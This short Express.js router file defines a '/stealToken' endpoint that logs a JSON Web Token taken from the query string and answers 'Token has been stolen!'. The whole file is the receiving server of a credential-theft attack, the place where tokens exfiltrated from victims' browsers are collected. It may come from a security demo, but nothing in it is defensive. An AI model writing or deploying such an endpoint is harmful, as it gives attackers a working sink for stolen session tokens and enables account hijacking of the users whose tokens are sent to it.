const express = require("express");
const passport = require("passport");

const router = express.Router();

router.get("/stealToken", (req, res) => {
  console.log("Stolen JWT Token: ", req.query.token);
  res.send("Token has been stolen!");
});

module.exports = router;
